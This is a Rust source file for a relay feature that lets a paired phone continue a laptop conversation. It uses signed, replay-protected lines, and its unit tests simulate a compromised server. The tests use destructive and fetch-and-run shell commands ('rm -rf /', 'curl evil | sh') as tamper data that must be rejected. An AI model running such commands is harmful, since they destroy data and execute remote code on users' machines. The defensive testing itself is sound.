//! A conversation on the laptop that its phone may continue (`/share-phone` in Relay), through the relay-server both
//! are paired with. The laptop never listens: it keeps a `share` connection open to the server, which asks it for a
//! fresh connection (`share_open`) for each request a phone makes for a shared conversation, and passes the bytes both
//! ways. The server relays; it must not be able to make the laptop do anything the phone did not ask.
//!
//! So the phone signs what it sends, and the laptop checks it here before anything reaches an agent:
//! - **The key.** The phone signs with its own certificate's private key (ECDSA P-256), which never leaves it. The
//!   laptop learns the public key at pairing: the QR it shows carries a one-time secret (`link`) that never goes to
//!   the server, and the phone's first signed request carries `HMAC(link, its public key)`. A valid one pins that key
//!   for good and the secret is gone; after that only pinned keys count.
//! - **No replays.** Every connection the laptop serves starts with a fresh random challenge. Each line the phone
//!   sends on it is signed over the challenge, the conversation key, a counter that only goes up, and the line itself.
//!   A line from another connection, an old one, one sent twice or one changed on the way is dropped.
//! - **Only what is shared.** The laptop answers only for the conversations shared at that moment, also when the
//!   server asks for another one.
//!
//! What it does not change: the server sees what passes (the conversation's lines, both ways), and can drop or delay
//! them. Read-only requests (`history`, following) are signed too, so the server cannot read a shared conversation
//! while the phone is not asking.

use crate::broker::Conn;
use crate::proto::{self, MAX_LINE};
use crate::tls::{self, Identity};
use ring::rand::SystemRandom;
use ring::signature::{EcdsaKeyPair, KeyPair, UnparsedPublicKey, ECDSA_P256_SHA256_FIXED, ECDSA_P256_SHA256_FIXED_SIGNING};
use ring::hmac;
use serde_json::{json, Value};
use std::io::{self, BufRead, BufReader, Write};
use std::sync::Arc;

/// What a signature covers, apart from the line: unambiguous (a JSON array) and only for this use.
fn message(challenge: &str, key: &str, n: u64, body: &str) -> Vec<u8> {
    format!("relay-phone-input/1\n{}", json!([challenge, key, n, body])).into_bytes()
}
fn link_msg(pk_hex: &str) -> String { format!("relay-phone-key\n{}", pk_hex.to_ascii_lowercase()) }
/// The phone's proof that it scanned the laptop's QR: HMAC-SHA256 of its public key, keyed with the QR's `link`.
pub fn link_proof(link: &str, pk_hex: &str) -> String {
    hex(hmac::sign(&hmac::Key::new(hmac::HMAC_SHA256, link.as_bytes()), link_msg(pk_hex).as_bytes()).as_ref())
}
fn hex(b: &[u8]) -> String { b.iter().map(|x| format!("{x:02x}")).collect() }
fn unhex(s: &str) -> Option<Vec<u8>> {
    if !s.len().is_multiple_of(2) { return None; }
    (0..s.len()).step_by(2).map(|i| s.get(i..i + 2).and_then(|h| u8::from_str_radix(h, 16).ok())).collect()
}

// ---------- the phone

/// Signs the lines of one connection: its challenge, its conversation, a counter.
pub struct Signer { pair: EcdsaKeyPair, rng: SystemRandom, pk: String, proof: String, challenge: String, key: String, n: u64 }
impl Signer {
    /// `id`: the phone's identity (its certificate's key signs), `link`: the secret from the laptop's QR.
    pub fn new(id: &Identity, link: &str, challenge: &str, key: &str) -> Result<Signer, String> {
        let rng = SystemRandom::new();
        let pair = EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_FIXED_SIGNING, &id.key_der, &rng).map_err(|e| format!("signing key: {e}"))?;
        let pk = hex(pair.public_key().as_ref());
        Ok(Signer { proof: link_proof(link, &pk), pair, rng, pk, challenge: challenge.into(), key: key.into(), n: 0 })
    }
    /// The next line, signed: `{pk, proof, key, n, body, sig}`.
    pub fn envelope(&mut self, body: &str) -> Value {
        let n = self.n;
        self.n += 1;
        let sig = self.pair.sign(&self.rng, &message(&self.challenge, &self.key, n, body)).map(|s| hex(s.as_ref())).unwrap_or_default();
        json!({"pk": self.pk, "proof": self.proof, "key": self.key, "n": n, "body": body, "sig": sig})
    }
}

/// A writer that sends each line written to it as a signed envelope (the phone's stdin to a shared conversation).
pub struct SignedLines<W: Write> { inner: W, signer: Signer, buf: Vec<u8> }
impl<W: Write> SignedLines<W> {
    pub fn new(inner: W, signer: Signer) -> Self { SignedLines { inner, signer, buf: Vec::new() } }
}
impl<W: Write> Write for SignedLines<W> {
    fn write(&mut self, b: &[u8]) -> io::Result<usize> {
        self.buf.extend_from_slice(b);
        while let Some(i) = self.buf.iter().position(|&c| c == b'\n') {
            let line: Vec<u8> = self.buf.drain(..=i).collect();
            let body = String::from_utf8_lossy(&line[..i]).into_owned();
            // one write per line, so two writers on one connection never interleave inside a line
            self.inner.write_all(format!("{}\n", self.signer.envelope(&body)).as_bytes())?;
        }
        Ok(b.len())
    }
    fn flush(&mut self) -> io::Result<()> { self.inner.flush() }
}

// ---------- the laptop

/// The phones a laptop trusts on one machine: pinned public keys (hex), and the links of pairings not used yet.
#[derive(serde::Serialize, serde::Deserialize, Default, Clone, Debug, PartialEq)]
pub struct Phones { #[serde(default)] pub keys: Vec<String>, #[serde(default)] pub links: Vec<String> }
impl Phones {
    /// Whether `pk` may sign: pinned, or proven with a link, which then pins it and is used up. True also says
    /// whether anything changed is the caller's to find out (compare before and after) and save.
    pub fn admit(&mut self, pk_hex: &str, proof_hex: &str) -> bool {
        let pk = pk_hex.to_ascii_lowercase();
        let tag = unhex(proof_hex).unwrap_or_default();
        if let Some(i) = self.links.iter().position(|l| hmac::verify(&hmac::Key::new(hmac::HMAC_SHA256, l.as_bytes()), link_msg(&pk).as_bytes(), &tag).is_ok()) {
            self.links.remove(i);
            if !self.keys.contains(&pk) { self.keys.push(pk); }
            return true;
        }
        self.keys.contains(&pk)
    }
    pub fn is_empty(&self) -> bool { self.keys.is_empty() && self.links.is_empty() }
}

/// Checks the lines of one connection after its first: the same key, the same conversation, a higher counter.
#[derive(Debug)]
pub struct Verifier { pk: String, challenge: String, key: String, last: u64 }
impl Verifier {
    /// The first line of a connection: a key `admit` accepts, a valid signature, and a body that is a request for
    /// the conversation the signature names. Returns the verifier for the rest and the request.
    pub fn first(env: &Value, challenge: &str, admit: impl FnOnce(&str, &str) -> bool) -> Result<(Verifier, Value), String> {
        let (pk, key) = (env["pk"].as_str().unwrap_or("").to_ascii_lowercase(), env["key"].as_str().unwrap_or(""));
        if pk.is_empty() || !admit(&pk, env["proof"].as_str().unwrap_or("")) { return Err("not a phone this Mac paired".into()); }
        let n = env["n"].as_u64().ok_or("unsigned")?;
        let mut v = Verifier { pk, challenge: challenge.into(), key: key.into(), last: n };
        let body = v.verify(env, n)?;
        let req: Value = serde_json::from_str(&body).map_err(|_| "not a request")?;
        if req["key"].as_str() != Some(key) { return Err("the request is for another conversation than signed".into()); }
        v.last = n;
        Ok((v, req))
    }
    /// A later line: its body when it is signed by the same key, for this connection and conversation, with a counter
    /// above the last one.
    pub fn next(&mut self, env: &Value) -> Result<String, String> {
        let n = env["n"].as_u64().ok_or("unsigned")?;
        if n <= self.last { return Err("replayed".into()); }
        if env["pk"].as_str().map(str::to_ascii_lowercase).as_deref() != Some(&self.pk) { return Err("another key".into()); }
        let body = self.verify(env, n)?;
        self.last = n;
        Ok(body)
    }
    fn verify(&self, env: &Value, n: u64) -> Result<String, String> {
        let (body, sig) = (env["body"].as_str().ok_or("unsigned")?, env["sig"].as_str().and_then(unhex).ok_or("unsigned")?);
        let pk = unhex(&self.pk).ok_or("bad key")?;
        UnparsedPublicKey::new(&ECDSA_P256_SHA256_FIXED, pk).verify(&message(&self.challenge, &self.key, n, body), &sig).map_err(|_| "bad signature")?;
        Ok(body.to_string())
    }
}

/// What the laptop gives a phone of a shared conversation. `shared` is asked again for every line that goes out, so
/// a conversation that stops being shared (or reads mail) stops going to the phone at once.
pub trait Local: Send + Sync {
    fn shared(&self, key: &str) -> bool;
    /// The conversation's agent, started when it has none: the frames it says from now on, and its stdin.
    fn attach(&self, key: &str) -> Result<Conn, String>;
    fn kill(&self, key: &str, pid: u32) -> Result<(), String>;
    /// `{items, next}`, as `history` on a server.
    fn history(&self, key: &str) -> Result<Value, String>;
    /// Phones::admit on this machine's phones, saved when it pinned a key.
    fn admit(&self, pk: &str, proof: &str) -> bool;
}

/// One connection the server opened for a phone (`share_open`): the phone's request line as the server passed it
/// (not trusted, not used), a challenge back, then only signed lines. `attach` streams the agent's frames to the phone
/// and its signed lines to the agent; `kill` and `history` answer once.
pub fn serve(mut r: BufReader<tls::Reader>, mut w: tls::Writer, local: Arc<dyn Local>) -> io::Result<()> {
    let _unsigned = proto::read_json(&mut r, MAX_LINE)?;
    let challenge = tls::random_key();
    proto::write_json(&mut w, &json!({"challenge": challenge}))?;
    let env = proto::read_json(&mut r, MAX_LINE)?;
    let (mut v, req) = match Verifier::first(&env, &challenge, |pk, proof| local.admit(pk, proof)) {
        Ok(x) => x,
        Err(e) => { eprintln!("relay: a request from the phone dropped: {e}"); return done(&mut w, Err(e)); }
    };
    let key = req["key"].as_str().unwrap_or("").to_string();
    let op = req["op"].as_str().unwrap_or("");
    if !local.shared(&key) {
        let why = "not shared with the phone".to_string();
        return if op == "attach" { bang(&mut w, &why) } else { done(&mut w, Err(why)) };
    }
    match op {
        "kill" => done(&mut w, local.kill(&key, req["pid"].as_u64().unwrap_or(0) as u32).map(|_| json!({}))),
        "history" => done(&mut w, local.history(&key)),
        "attach" => {
            let Conn { agent, mut stdin, frames, backlog } = match local.attach(&key) { Ok(c) => c, Err(e) => return bang(&mut w, &e) };
            // the hello of a broker from before ids: the phone sends no id, this Mac follows its broker as `phone`
            w.write_all(format!("p {} {backlog}\n", agent.id()).as_bytes())?;
            let (mut out, l2, k2) = (w.clone(), local.clone(), key.clone());
            // ponytail: not joined. Once the phone is gone this thread ends at the agent's next line (the write fails),
            // or when the phone comes back (the broker drops the old `phone` connection); a broker Conn cannot be shut
            // from here
            std::thread::spawn(move || {
                for l in frames.lines().map_while(Result::ok) {
                    if !l2.shared(&k2) || out.write_all(format!("{l}\n").as_bytes()).is_err() { break; }
                }
                out.shutdown();
            });
            while let Ok(env) = proto::read_json(&mut r, MAX_LINE) {
                match v.next(&env) {
                    Ok(line) if local.shared(&key) => { if stdin.write_all(format!("{line}\n").as_bytes()).and_then(|_| stdin.flush()).is_err() { break; } }
                    Ok(_) => break,
                    Err(e) => eprintln!("relay: a line from the phone dropped: {e}"),
                }
            }
            w.shutdown();
            Ok(())
        }
        _ => done(&mut w, Err(format!("unknown request {op:?}"))),
    }
}
fn done(w: &mut tls::Writer, res: Result<Value, String>) -> io::Result<()> {
    let v = match res { Ok(mut v) => { v["ok"] = json!(true); v } Err(e) => json!({"ok": false, "error": e}) };
    proto::write_json(w, &v)?;
    w.shutdown();
    Ok(())
}
fn bang(w: &mut tls::Writer, why: &str) -> io::Result<()> {
    writeln!(w, "! {}", why.replace('\n', " "))?;
    w.shutdown();
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn id() -> Identity { Identity::generate().unwrap() }
    fn pk_of(i: &Identity) -> String { Signer::new(i, "x", "c", "k").unwrap().pk }

    #[test]
    fn signed_lines_pass_and_tampered_replayed_unsigned_or_foreign_ones_do_not() {
        let (phone, link, ch) = (id(), tls::random_secret(), tls::random_key());
        let mut phones = Phones { keys: vec![], links: vec![link.clone()] };
        let mut s = Signer::new(&phone, &link, &ch, "c:1").unwrap();
        let first = s.envelope(&json!({"op": "attach", "key": "c:1"}).to_string());

        // the link pins the phone's key, once; the same link does not pin another key after that
        let (mut v, req) = Verifier::first(&first, &ch, |pk, p| phones.admit(pk, p)).unwrap();
        assert_eq!(req["op"], "attach");
        assert_eq!(phones, Phones { keys: vec![pk_of(&phone)], links: vec![] });
        let thief = id();
        let mut t = Signer::new(&thief, &link, &ch, "c:1").unwrap();
        assert!(Verifier::first(&t.envelope(&json!({"op": "attach", "key": "c:1"}).to_string()), &ch, |pk, p| phones.clone().admit(pk, p)).is_err(), "link used up");

        // valid
        let hi = s.envelope("hello");
        assert_eq!(v.next(&hi).unwrap(), "hello");
        // replayed: the same line again, or an older one
        assert_eq!(v.next(&hi).unwrap_err(), "replayed");
        // tampered: the body, the counter, the conversation
        let mut x = s.envelope("rm -rf");
        x["body"] = json!("rm -rf /");
        assert_eq!(v.next(&x).unwrap_err(), "bad signature");
        let mut y = s.envelope("ok");
        y["n"] = json!(99);
        assert_eq!(v.next(&y).unwrap_err(), "bad signature");
        // unsigned
        assert_eq!(v.next(&json!({"n": 50, "body": "hi", "pk": pk_of(&phone)})).unwrap_err(), "unsigned");
        assert_eq!(v.next(&json!({"body": "hi"})).unwrap_err(), "unsigned");
        // the wrong key: another identity signing for itself on this connection
        let mut other = Signer::new(&thief, &link, &ch, "c:1").unwrap();
        other.n = 60;
        assert_eq!(v.next(&other.envelope("hi")).unwrap_err(), "another key");
        // the wrong key claiming the phone's public key
        let mut forged = other.envelope("hi");
        forged["pk"] = json!(pk_of(&phone));
        assert_eq!(v.next(&forged).unwrap_err(), "bad signature");
        // after all that, the phone's next line still passes
        assert_eq!(v.next(&s.envelope("still")).unwrap(), "still");
    }

    #[test]
    fn a_line_from_another_connection_or_conversation_does_not_pass() {
        let phone = id();
        let mut phones = Phones { keys: vec![pk_of(&phone)], links: vec![] };
        let (a, b) = (tls::random_key(), tls::random_key());
        let mut s = Signer::new(&phone, "", &a, "c:1").unwrap();
        let first = s.envelope(&json!({"op": "kill", "key": "c:1", "pid": 7}).to_string());
        // replayed on a new connection: that one has its own challenge
        assert_eq!(Verifier::first(&first, &b, |pk, p| phones.admit(pk, p)).unwrap_err(), "bad signature");
        // signed for c:1, the request inside names c:2
        let mut s2 = Signer::new(&phone, "", &a, "c:1").unwrap();
        assert!(Verifier::first(&s2.envelope(&json!({"op": "kill", "key": "c:2"}).to_string()), &a, |pk, p| phones.admit(pk, p)).is_err());
        // the envelope's key changed on the way
        let mut moved = Signer::new(&phone, "", &a, "c:1").unwrap().envelope(&json!({"op": "kill", "key": "c:1"}).to_string());
        moved["key"] = json!("c:2");
        assert!(Verifier::first(&moved, &a, |pk, p| phones.admit(pk, p)).is_err());
        // a key never pinned, without a link
        let stranger = id();
        let e = Signer::new(&stranger, "", &a, "c:1").unwrap().envelope(&json!({"op": "kill", "key": "c:1"}).to_string());
        assert_eq!(Verifier::first(&e, &a, |pk, p| phones.admit(pk, p)).unwrap_err(), "not a phone this Mac paired");
        // the genuine one
        assert!(Verifier::first(&first, &a, |pk, p| phones.admit(pk, p)).is_ok());
    }

    /// A Mac with one shared conversation whose agent is the other end of a socket the test reads.
    struct OneConv { agent: std::sync::Mutex<Option<std::os::unix::net::UnixStream>>, phones: std::sync::Mutex<Phones> }
    impl Local for OneConv {
        fn shared(&self, key: &str) -> bool { key == "c:1" }
        fn attach(&self, _: &str) -> Result<Conn, String> {
            let a = self.agent.lock().unwrap().take().ok_or("once")?;
            Ok(Conn { agent: 42.into(), stdin: Box::new(a.try_clone().unwrap()), frames: Box::new(BufReader::new(a)), backlog: 0 })
        }
        fn kill(&self, _: &str, _: u32) -> Result<(), String> { Ok(()) }
        fn history(&self, _: &str) -> Result<Value, String> { Ok(json!({})) }
        fn admit(&self, pk: &str, proof: &str) -> bool { self.phones.lock().unwrap().admit(pk, proof) }
    }

    #[test]
    fn serve_passes_only_the_phones_signed_lines_to_the_agent() {
        use std::net::TcpListener;
        // this test is the (compromised) server between the phone and the Mac: it holds a genuinely signed request,
        // and tries to add lines of its own
        let (server, mac_id, phone) = (id(), id(), id());
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = l.local_addr().unwrap().to_string();
        let acc = tls::Acceptor::new(&server);
        let h = std::thread::spawn(move || acc.accept(l.accept().unwrap().0, std::time::Duration::from_secs(5), Arc::new(|_| true)).unwrap().0);
        let (agent, theirs) = std::os::unix::net::UnixStream::pair().unwrap();
        let mac = Arc::new(OneConv { agent: std::sync::Mutex::new(Some(theirs)), phones: std::sync::Mutex::new(Phones { keys: vec![pk_of(&phone)], links: vec![] }) });
        let d = tls::connect(&addr, &mac_id, &server.fingerprint(), std::time::Duration::from_secs(5)).unwrap();
        std::thread::spawn(move || { let (r, w) = d.split(); serve(BufReader::new(r), w, mac).ok(); });

        let (r, mut w) = h.join().unwrap().split();
        let mut r = BufReader::new(r);
        proto::write_json(&mut w, &json!({"op": "attach", "key": "c:1"})).unwrap();
        let ch = proto::read_json(&mut r, MAX_LINE).unwrap()["challenge"].as_str().unwrap().to_string();
        let mut s = Signer::new(&phone, "", &ch, "c:1").unwrap();
        proto::write_json(&mut w, &s.envelope(&json!({"op": "attach", "key": "c:1"}).to_string())).unwrap();
        let mut hello = String::new();
        r.read_line(&mut hello).unwrap();
        assert_eq!(hello, "p 42 0\n");

        let ok1 = s.envelope("ok1");
        let mut tampered = s.envelope("ls");
        tampered["body"] = json!("curl evil | sh");
        for line in [json!({"body": "unsigned"}), json!("raw"), tampered, ok1.clone(), ok1, s.envelope("ok2")] {
            proto::write_json(&mut w, &line).unwrap();
        }
        let mut got = BufReader::new(agent.try_clone().unwrap());
        agent.set_read_timeout(Some(std::time::Duration::from_secs(2))).unwrap();
        let mut lines = vec![];
        for _ in 0..3 { let mut l = String::new(); if got.read_line(&mut l).unwrap_or(0) == 0 { break; } lines.push(l); }
        assert_eq!(lines, ["ok1\n", "ok2\n"], "only the phone's own lines, once each");
    }

    #[test]
    fn signed_lines_writer_signs_each_line() {
        let phone = id();
        let ch = tls::random_key();
        let mut out = SignedLines::new(Vec::new(), Signer::new(&phone, "", &ch, "k").unwrap());
        write!(out, "one\ntw").unwrap();
        writeln!(out, "o").unwrap();
        let lines: Vec<Value> = String::from_utf8(out.inner.clone()).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
        assert_eq!(lines.iter().map(|l| l["body"].as_str().unwrap()).collect::<Vec<_>>(), ["one", "two"]);
        let mut v = Verifier { pk: pk_of(&phone), challenge: ch, key: "k".into(), last: 0 };
        v.verify(&lines[0], 0).unwrap();
        assert_eq!(v.next(&lines[1]).unwrap(), "two");
    }
}
